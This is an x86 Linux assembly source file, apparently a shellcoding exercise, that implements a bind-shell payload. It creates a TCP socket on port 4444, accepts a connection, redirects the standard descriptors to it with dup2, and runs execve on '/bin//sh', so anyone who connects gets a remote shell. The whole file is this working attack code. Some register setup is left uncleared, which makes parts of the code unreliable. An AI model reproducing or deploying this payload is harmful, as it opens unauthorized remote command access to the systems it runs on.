
global _start

section .bss           ;Uninitialized data
   input resb 4

section .text

_start :

%assign AF_INET 2
%assign  SYS_SOCKET 1; sys_socket = 1 
%assign SOCK_STREAM 1 ; Connection TCP 
%assign SYS_BIND 2; sys_bind = 2
%assign SYS_LISTEN 4; sys_ listen =4
%assign SYS_ACCEPT 5; socket


;ReadUser Input
;Read and store the user input
   ;mov eax, 3
   ;mov ebx, 2
   ;mov ecx, input  
   ;mov edx, 5          ;5 bytes (numeric, 1 for sign) of that information
   ;int 80h
;   mov edi,ecx

;Socket
	mov al,102 ; syscall - socketcall
	mov bl, SYS_SOCKET ; type sys_socket
	; socket(domain,type,protocol)
	xor edx,edx
	push edx ; protocol
	push SOCK_STREAM ; type
	push AF_INET ; domain 2
	mov ecx, esp

	int 0x80
	mov esi,eax
;bind
	mov al,102
	mov bl, SYS_BIND
	; bind (sockfd, struct sockaddr * addr, socklen_t addrlen)
	; bind (eax [4444,2],??)

	; build struct sockaddr
	;push AF_INET;
	push edx
	;push input ;userinput of port bind
	push word 0x5c11; port 4444 DEC -> HEX, little endian
	push word AF_INET ; 
	mov ecx,esp

	;build bind
	push byte 0x10; length ...need to figure out how to calculate
	push ecx ; point er to sockaddr
	mov edi,esi ; copy fd
	push esi ; fd

	mov ecx,esp ; make pointer to args into ecx

	int 0x80
;listen
; listen(sockfd,int backlog)
	mov esi,edi ; copy fd to esi
	mov al, 102
	mov bl, SYS_LISTEN ; 4
	push edx ; backlog
	push esi ;  fd =3
	mov ecx,esp
	int 0x80

;accept
; accept(sockfd,struct sockaddr,*socklen)
	mov al,102
	mov bl, SYS_ACCEPT
	push edx
	push edx
	;push 0x3
	push esi ; fd=3
	mov ecx,esp
	int 0x80
; redirect to STDIN
;exec shell

mov bl,al ;return value is in eax, is the new FD! ...had to fix this to make it work
xor ecx,ecx
; dup2 (old,new)
; dup2(ebx,ecx++)
builddup:
	mov al,0x3f ; dup2 63 system call
	int 0x80
	inc ecx
	cmp cl,0x4

	jne builddup
xor eax,eax
push  eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
;push  eax
;push ebx
;mov ecx,edx ; mov zero
mov ecx,edx ; move zero
;mov edx,0
mov al, 0xb
int 0x80
